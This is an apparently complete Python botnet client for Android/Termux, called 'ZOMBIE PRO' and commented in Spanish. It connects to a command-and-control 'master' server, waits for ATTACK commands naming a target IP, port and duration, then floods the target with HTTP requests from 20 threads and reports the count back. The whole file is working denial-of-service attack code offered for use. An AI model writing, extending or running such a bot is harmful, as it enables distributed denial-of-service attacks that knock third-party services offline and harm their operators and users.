#!/data/data/com.termux/files/usr/bin/python3
"""
🤖 ZOMBIE PRO - Para Maestro Profesional
"""

import socket
import threading
import time
import random

MASTER_IP = "192.168.1.10"  # CAMBIA
MASTER_PORT = 9999
ZOMBIE_ID = f"ANDROID_{random.randint(1000,9999)}"

def connect_to_master():
    while True:
        try:
            sock = socket.socket()
            sock.settimeout(30)
            sock.connect((MASTER_IP, MASTER_PORT))
            
            # Recibir bienvenida
            welcome = sock.recv(1024).decode()
            if "WELCOME" in welcome:
                print("✅ Conectado al maestro profesional")
            
            # Mantener conexión
            while True:
                try:
                    # Enviar ping
                    sock.send(b"PING\n")
                    
                    # Recibir comandos
                    data = sock.recv(1024).decode().strip()
                    if data == "PONG":
                        pass  # Keep-alive normal
                    elif data.startswith("ATTACK|"):
                        # Comando de ataque
                        _, target, port, duration = data.split("|")
                        launch_attack(target, int(port), int(duration), sock)
                    
                    time.sleep(5)
                    
                except socket.timeout:
                    continue
                except:
                    break
                    
            sock.close()
            
        except Exception as e:
            print(f"❌ Error: {e}. Reconectando en 5s...")
            time.sleep(5)

def launch_attack(target_ip, target_port, duration, master_sock):
    """Ataque brutal sin sleep"""
    print(f"🔥 ATAQUE ORDENADO: {target_ip}:{target_port}")
    
    end_time = time.time() + duration
    count = 0
    
    # Request pre-compilado
    request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n".encode()
    
    # Lanzar múltiples hilos
    def attacker():
        nonlocal count
        while time.time() < end_time:
            try:
                s = socket.socket()
                s.settimeout(0.05)
                s.connect((target_ip, target_port))
                s.send(request)
                s.close()
                count += 1
            except:
                pass
    
    # 20 hilos de ataque
    threads = []
    for _ in range(20):
        t = threading.Thread(target=attacker, daemon=True)
        t.start()
        threads.append(t)
    
    # Esperar
    for t in threads:
        t.join(timeout=duration)
    
    # Reportar
    print(f"✅ Ataque completado: {count} requests")
    master_sock.send(f"REPORT|Attack completed: {count} requests\n".encode())

if __name__ == "__main__":
    print("🤖 ZOMBIE PROFESIONAL ACTIVADO")
    print(f"🎯 Maestro: {MASTER_IP}:{MASTER_PORT}")
    connect_to_master()
